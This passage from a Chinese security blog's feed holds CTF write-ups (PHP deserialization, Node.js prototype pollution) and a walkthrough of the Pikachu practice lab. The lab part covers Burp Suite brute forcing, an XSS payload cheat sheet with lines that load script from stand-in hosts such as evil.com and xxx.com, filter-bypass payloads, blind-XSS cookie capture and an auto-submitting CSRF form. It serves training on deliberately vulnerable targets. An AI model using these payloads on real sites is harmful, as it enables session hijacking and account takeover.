语句中给一个具有引用的变量赋值，被引用的对象也被改变。</p><ul><li>1.类属性仅允许使用以下类型的数据进行初始化</li><li>标量和数组字面量:字符串,数值,常量,数组,原型文档(php5.3+)</li><li>2.不允许使用:变量,表达式,对象</li><li>3.类常量使用关键字const声明,不允许设置访问限制符,强制为public,不能更改</li><li>4.类常量是属性类的,不属性它的某个实例对象,必须使用类才可以访问</li><li>5.访问类常量要使用范围解析符::,双冒号</li><li>在类中使用关键字self表示当前类,在外部可直接使用类名</li></ul><p>serialize() 可处理除了 resource 之外的任何类型。甚至可以 serialize() 那些包含了指向其自身引用的数组。serialize() 的数组／对象中的引用也将被存储。</p><p>O:5:”funny”:2:{s:15:”%00funny%00password”;s:1:”2”;s:6:”verify”;r:1;}<br>”you die”    QAQ<br>R为指针引用，将两个属性指向同一指针地址<br><code>Poc：O:5:&quot;funny&quot;:2:&#123;s:15:&quot;%00funny%00password&quot;;R:1;s:6:&quot;verify&quot;;R:1;&#125;</code><br>即得：GXUCTF{thr33_eq4@15_5i9n_i5_s0_e@sy}</p><h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p><img src="https://i.loli.net/2021/02/13/1cTRz4E9yOwPJp2.png"></p><p>调用pyflag()即可<br>1.@unserialize($_GET[‘try’])();为错误的语法<br>2.@表示无回显，因此有了开头的报错定义需要我们反序列化<br>3.目标：通过传入序列化参数使@unserialize($_GET[‘try’])();反序列化成为funny::pyflag();<br>原有();固需要传入的参数为：funny::pyflag;序列化后得到</p><p><code>poc：s:13:&quot;funny::pyflag&quot;;</code></p><p><img src="https://i.loli.net/2021/02/13/QlS4CIHKPVjwXRx.png"></p><h2 id="Easynodejs"><a href="#Easynodejs" class="headerlink" title="Easynodejs"></a>Easynodejs</h2><p>考点是    nodejs的原型链污染</p><p><img src="https://i.loli.net/2021/02/13/Htu1qTms4S7dhKR.png"></p><p>题目如下：</p><p><img src="https://i.loli.net/2021/02/13/g4sZ51UOv3YjhSL.png"></p><p>通过传参row、key、value赋值morouu[row][key]=value</p><p>使得判断条件yhck[‘money’] === 100000000000为真；输出flag</p><p><img src="https://i.loli.net/2021/02/13/mPzwrBnDekYZpul.png"></p><p><code>Poc：?row=__proto__&amp;key=money&amp;value=100000000000</code></p><p>即得flag：GXU-CTF{Wow_No1dejs_is_s0_interesting}</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu靶场通关小记</title>
      <link href="2021/01/16/Pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%B0%8F%E8%AE%B0/"/>
      <url>2021/01/16/Pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="Pikachu靶场的小记"><a href="#Pikachu靶场的小记" class="headerlink" title="Pikachu靶场的小记"></a>Pikachu靶场的小记</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>重在知识~~随便打打</p><blockquote><p>我追求的并不是一个「结果」，一旦只追求「结果」，人就容易想方设法抄近路，在抄近路的过程中，人又容易迷失真相，做事的干劲也会逐渐消磨殆尽，我认为最重要的是想要「追求真实」的意志。”</p></blockquote><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><ul><li><p>爆破关卡有四小关</p></li><li><p>暴力破解就像一道填入答案就能知道正确与否的选择题，四个答案逐个尝试直到正确为止<br>但暴力破解的选择题不会直接给出答案的内容和数量，这时就需要结合字典了</p></li><li><p>爆破其实很少能得出结果(对于那些遵循了认证安全策略的系统而言)</p></li><li><p>关于字典：</p><ol><li>通过网站得到管理员或者用户的各种信息生成字典进行爆破</li><li>网上一些汇总的字典</li></ol></li></ul><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>很简单的登陆框<br>burpsuite抓一下包直接爆破即可</p><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>接下来就涉及到验证码了<br>需要分析一下验证码的验证机制：</p><p>第二关在服务端检测验证码，利用burpsuite的repeat模块，先输入正确的验证码，再输入错误的验证码，再输入正确的验证码，三次发送send，若第三次于第一次结果相同则可能存在验证码的无条件不刷新<br>第三关输入错误的验证码，会弹出框框即前端js验证</p><h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><p>这里是在服务端进行检测，但此处的验证码可以重复使用即无条件不刷新</p><ul><li>无条件不刷新：某一时间段内，不刷新页面就可以无限次数的使用同一验证码，无论登陆成功与否 </li><li>bypass: 还是burpsuite抓包，将验证码作为常量即可</li></ul><h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><ul><li>此处的验证码在前端进行检测</li><li>bypass: 仍然是burpsuite抓包，直接将传送验证码的参数变量去掉即可</li></ul><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><ul><li><p>抓包发现提交的变量中多了一个token变量，再对返回包分析，可以确认token数值由返回包确定<br>因此每次登陆都要将上一个返回包的token值放入其中</p></li><li><p>利用burpsuite的intruder的草叉模式(pitchfork)：不同位置对应不同的字典<br>密码爆破仍选择字典，token需要抓取上一个返回包：</p></li></ul><h4 id="利用burpsuite递归抓取返回包"><a href="#利用burpsuite递归抓取返回包" class="headerlink" title="利用burpsuite递归抓取返回包"></a>利用burpsuite递归抓取返回包</h4><ul><li>在选项中修改线程数为1(因为每次都要抓取上一个返回包的token)</li></ul><p><img src="https://i.loli.net/2021/02/13/7Eqzh5w4GUM8Rri.png"></p><ul><li>点击Add</li></ul><p><img src="https://i.loli.net/2021/02/13/mFkKJ7bXnCcgivI.png"></p><ul><li>Refetch response得到返回包，搜索token然后选中即可</li></ul><p><img src="https://i.loli.net/2021/02/13/VDJcv3ZrHMeo4Ip.png"></p><ul><li>选择递归模式：</li></ul><p><img src="https://i.loli.net/2021/02/13/VkZUvCapz7tTIyP.png"></p><p>Redirections(重定向)选择always,就可以开始爆破啦</p><p><img src="https://i.loli.net/2021/02/13/QJgXLfArvGy5WiP.png"></p><h1 id="xss跨站脚本-js！！！"><a href="#xss跨站脚本-js！！！" class="headerlink" title="xss跨站脚本(js！！！)"></a>xss跨站脚本(js！！！)</h1><p>可以打一下xss-libs~~~</p><blockquote><p>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p><p>存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie</p><p>反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面</p><p>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。 </p></blockquote><h2 id="常见的payload："><a href="#常见的payload：" class="headerlink" title="常见的payload："></a>常见的payload：</h2><p>转自<a href="https://blog.csdn.net/qq_35393693/article/details/86597707?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161041848616780255257057%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=161041848616780255257057&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-86597707.pc_search_result_no_baidu_js&amp;utm_term=xss%E6%94%BB%E5%87%BB">XSS(跨站脚本)漏洞详解之XSS跨站脚本攻击漏洞的解决</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;标签：可以引用外部的JavaScript代码，也可以将代码插入脚本标记</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;xxx.com&#x2F;xss.js&gt;&lt;&#x2F;script&gt;  #引用外部的xss</span><br><span class="line">&lt;script&gt; alert(&quot;hack&quot;)&lt;&#x2F;script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt; #弹出cookie</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;img&gt;标签：</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(&#x2F;hack&#x2F;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(document.cookie)&gt;  #弹出cookie</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(123)&gt;      注：对于数字，可以不用引号</span><br><span class="line">&lt;img  src&#x3D;&quot;javascript:alert(&quot;XSS&quot;);&quot;&gt;</span><br><span class="line">&lt;img  dynsrc&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br><span class="line">&lt;img  lowsrc&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;标签：</span><br><span class="line">&lt;body onload&#x3D;alert(&quot;XSS&quot;)&gt;  #使用onload属性在标记内部传递XSS有效内容</span><br><span class="line">&lt;body background&#x3D;&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt; #或其他更加模糊的属性在标记内部传递XSS有效内容</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&gt;标签：</span><br><span class="line">&lt;iframe src&#x3D;”http:&#x2F;&#x2F;evil.com&#x2F;xss.html”&gt;</span><br><span class="line"></span><br><span class="line">该&lt;iframe&gt;标签允许另一个HTML网页的嵌入到父页面。IFrame可以包含JavaScript，但是，请注意，由于浏览器的内容安全策略（CSP），iFrame中的JavaScript无法访问父页面的DOM。然而，IFrame仍然是非常有效的解除网络钓鱼攻击的手段。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input&gt;标签：若标记的type属性&lt;input&gt;设置为image，则可以对其进行操作以嵌入脚本</span><br><span class="line">&lt;input type&#x3D;&quot;image&quot; src&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link&gt;标签：用来连接外部的样式表可以包含的脚本</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;标签：可利用background属性来引用脚本，而非image</span><br><span class="line">&lt;table background&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br><span class="line">&lt;td background&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;标签：指定一个背景从而嵌入的脚本，类似table</span><br><span class="line">&lt;div style&#x3D;&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br><span class="line">&lt;div style&#x3D;&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;object&gt;标签：可用于从外部站点脚本包含</span><br><span class="line">&lt;object type&#x3D;&quot;text&#x2F;x-scriptlet&quot; data&#x3D;&quot;http:&#x2F;&#x2F;hacker.com&#x2F;xss.html&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS漏洞的挖掘"><a href="#XSS漏洞的挖掘" class="headerlink" title="XSS漏洞的挖掘"></a>XSS漏洞的挖掘</h2><p>黑盒测试</p><p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p><p>URL的每一个参数<br>URL本身<br>表单<br>搜索框<br>常见业务场景</p><p>重灾区：评论区、留言区、个人信息、订单信息等<br>针对型：站内信、网页即时通讯、私信、意见反馈<br>存在风险：搜索框、当前目录、图片属性等<br>白盒测试(代码审计)</p><p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p><p>PHP中常见的接收参数的方式有$_GET、$_POST、$_REQUEST等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p><p>也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p><p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。</p><p>同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。</p><h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p><p>前端-》后端-》前端：payload由前端提交到后端执行，再返回前端</p><h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p>1.反射型xss</p><p>2.表单get型提交，表单中限制长度，由于是get型，可直接在url中修改参数</p><p><img src="https://i.loli.net/2021/02/13/Nv2driIsLC5lf1B.png"></p><h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>1.反射型xss</p><p>2.post提交</p><p><img src="https://i.loli.net/2021/02/13/5AvnfNplYb2CqIw.png"></p><p>此处登录框无法执行xss</p><p>提示我们先登录</p><p><img src="https://i.loli.net/2021/02/13/6KTyFt9vr35q4Nf.png"></p><p>这里的表单框就可以进行xss攻击了</p><p>输入kobe有个小彩蛋<img src="https://i.loli.net/2021/02/13/5Dmnq24KgZ1wvQM.png" alt="20210112102605934.png"></p><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。</p><p>前端-》后端-》数据库-》后端-》前端：payload由前端提交，到后端执行，存储到数据库中；打开网页时又从数据库中得到数据发送到后端执行，再到前端。</p><p>直接在留言板中输入payload<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="https://i.loli.net/2021/02/13/wN7RkDHscbI3UjJ.png"></p><p>注入xss后每次访问都会触发，因为xss代码储存到了服务器中</p><p><img src="https://i.loli.net/2021/02/13/rQRy7FlCu8fiDo5.png"></p><h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>不经过后端，基于DOM即Document Object Model（文档对象模型）；也属于反射型xss，通过传入的参数来控制触发</p><p>click me！，检查元素，构造闭合</p><p><img src="https://i.loli.net/2021/02/13/Fsj4Oqi9TPAyDKN.png"></p><p><img src="https://i.loli.net/2021/02/13/x3ZUcVmphRW4dK2.png"></p><h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><p>一样的套路，只是参数位置不同</p><p><img src="https://i.loli.net/2021/02/13/GypHt4nFmIdvjsP.png"></p><h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>尽可能地于一切可能的地方提交XSS语句，只要后台管理员看到某一条语句，此语句就能被执行。<br>可在留言板上留下获取cookie的代码，只要管理员在后台看到，就能获取管理员的cookie。</p><p>如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/l3viQofK4WeatFb.png"></p><p>点击提示可以看到管理员登陆路径</p><p><img src="https://i.loli.net/2021/02/13/WgEbaVwl2z3Mvcq.png"></p><p>登陆后就能看到我们输入的语句，因此该语句被执行，cookie被获取</p><p><img src="https://i.loli.net/2021/02/13/UqYx7lsdwj4Wzar.png"></p><h2 id="xss过滤"><a href="#xss过滤" class="headerlink" title="xss过滤"></a>xss过滤</h2><p>bypas为了防止xss攻击而设置的waf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>看看过滤了什么</p><p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>  =》 ‘&gt;’</p><p><img src="https://i.loli.net/2021/02/13/HnZIpcgKvPu7OaC.png"></p><p><code>alert(document.cookie)</code> =&gt; ‘alert(document.cookie)’</p><p><img src="https://i.loli.net/2021/02/13/WGHE3wDIovOh5kg.png"></p><p><code>&lt;script&gt;</code>被过滤为<code>&gt;</code>;也就是说<code>&lt;script</code>被过滤</p><p>此处只能用 大小写绕过 或者 非script标签的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRipt&gt;alert(document.cookie)&lt;&#x2F;sCRipt&gt;</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(document.cookie)&gt; </span><br></pre></td></tr></table></figure><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">过滤部分：</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//这里会使用正则对&lt;script进行替换为空,也就是过滤掉</span></span><br><span class="line">    <span class="variable">$message</span>=preg_replace(<span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line"><span class="comment">//    $message=str_ireplace(&#x27;&lt;script&gt;&#x27;,$_GET[&#x27;message&#x27;]);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$message</span> == <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;那就去人民广场一个人坐一会儿吧!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;别说这些&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;的话,不要怕,就是干!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了如下的正则过滤，类似双写、注释干扰都无法生效了</p><p><img src="https://i.loli.net/2021/02/13/wpvoqGeBJXK3LR4.png"><br><img src="https://i.loli.net/2021/02/13/vXfZuO7iCdhteKa.png"></p><h3 id="xss过滤常见bypass"><a href="#xss过滤常见bypass" class="headerlink" title="xss过滤常见bypass:"></a>xss过滤常见bypass:</h3><p>大小写绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRipt&gt;alert(document.cookie)&lt;&#x2F;sCRipt&gt;</span><br></pre></td></tr></table></figure><p>双写绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;&#x2F;scr&lt;&#x2F;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>编码绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将payload进行html编码</span><br></pre></td></tr></table></figure><p>使用没被过滤的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如：&lt;img  src&#x3D;1  onerror&#x3D;alert(document.cookie)&gt; </span><br></pre></td></tr></table></figure><p>补一个没见过的注释干扰法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;!--test--&gt;pt&gt;alert(test)&lt;&#x2F;scr&lt;!--test--&gt;ipt&gt;</span><br></pre></td></tr></table></figure><h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2><p>htmlspecialchars():把预定义的字符转换为 HTML 实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string,flags,character-set,double_encode)</span><br><span class="line">预定义的字符是：</span><br><span class="line">&amp; （和号）成为 &amp;</span><br><span class="line">&quot; （双引号）成为 &quot;</span><br><span class="line">&#39; （单引号）成为 &#39;</span><br><span class="line">&lt; （小于）成为 &lt;</span><br><span class="line">&gt; （大于）成为 &gt;</span><br><span class="line">strings:规定要转换的字符串(必选，其余皆为可选)</span><br><span class="line"></span><br><span class="line">flags:</span><br><span class="line">可用的引号类型:</span><br><span class="line">ENT_COMPAT - 仅编码双引号(默认)。</span><br><span class="line">ENT_QUOTES - 编码双引号和单引号。</span><br><span class="line">ENT_NOQUOTES - 不编码任何引号。</span><br><span class="line"></span><br><span class="line">无效的编码:</span><br><span class="line">ENT_IGNORE - 忽略无效的编码，而不是让函数返回一个空的字符串。应尽量避免，因为这可能对安全性有影响。</span><br><span class="line">ENT_SUBSTITUTE - 把无效的编码替代成一个指定的带有 Unicode 替代字符 U+FFFD（UTF-8）或者 &amp;#FFFD; 的字符，而不是返回一个空的字符串。</span><br><span class="line">ENT_DISALLOWED - 把指定文档类型中的无效代码点替代成 Unicode 替代字符 U+FFFD（UTF-8）或者 &amp;#FFFD;。</span><br><span class="line"></span><br><span class="line">character-set：规定了要使用的字符集的字符串；默认为utf-8</span><br><span class="line"></span><br><span class="line">double_encode：规定了是否编码已存在的 HTML 实体；为bool型(TRUE&#x2F;FALSE)</span><br><span class="line"></span><br><span class="line">ps:$test &#x3D; htmlspecialchars($name, ENT_QUOTES);</span><br></pre></td></tr></table></figure><p>此处xss漏洞可能存在的原因是：htmlspecialchars()函数默认对双引号编码，开发者不对单引号进行过滤( flags != ENT_QUOTES )的话就可能导致xss发送</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;&#39;alert(1)&#39;  #第一个单引号构造闭合；其后两个单引号确保参数不被过滤</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/lOBqcQizpEeoL32.png"></p><p><img src="https://i.loli.net/2021/02/13/px138UhcSXsrZFn.png"></p><p>这里也可以用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;&#39;alert(1)</span><br></pre></td></tr></table></figure><p>输入’ onclick=’alert(1)，检查如下：</p><p><img src="https://i.loli.net/2021/02/13/B3ol2DxtfuWyCOJ.png"></p><p>则可直接’ onclick=’alert(1)即可构造闭合</p><p><img src="https://i.loli.net/2021/02/13/GHZ3l2Mh6cdVeY5.png"></p><h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><p>当输出在a标签里的href属性时，可以用js协议来执行js代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/agRLiSwItMkbPpc.png"></p><h2 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h2><p>先尝试<code>javascript:alert(document.cookie)</code></p><p><img src="https://i.loli.net/2021/02/13/6MujQIK5EToaROw.png"></p><p>发现我们的输入被插入到了<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>之间<img src="https://i.loli.net/2021/02/13/1uqfpyblSezWXaM.png"></p><p>可以根据此构造闭合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;javascript:alert(document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/SWBmEryhnje5VMt.png"></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>利用目标用户的合法身份，以目标用户的名义执行某些非法操作</p><p>CSRF与xss差别就在于：xss利用站内用户信任点，CSRF利用</p><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>修改的参数以get形式传输，由此可以伪造链接给受害者点击</p><p><img src="https://i.loli.net/2021/02/13/VWMkeIBN2mc8Evn.png"></p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>修改的信息以post形式传输</p><p><img src="https://i.loli.net/2021/02/13/ladkx4vpMRymZKV.png"></p><p>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://wooyun.org/csrf.php</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;xx&quot;</span> <span class="attr">value</span>=<span class="string">&quot;11&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作</p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>利用Token防止CSRF机制：</p><p>CSRF的主要问题是敏感操作的链接容易被伪造，添加Token，每次请求,都增加一个随机码(利用算法，生成不可猜测的token随机码) , 后台在每次登录时都对随机码token进行验证，与服务端生成的session进行比较。</p><p><strong>Token</strong>：</p><p>目前主流的做法是使用Token抵御CSRF攻击。下面通过分析CSRF 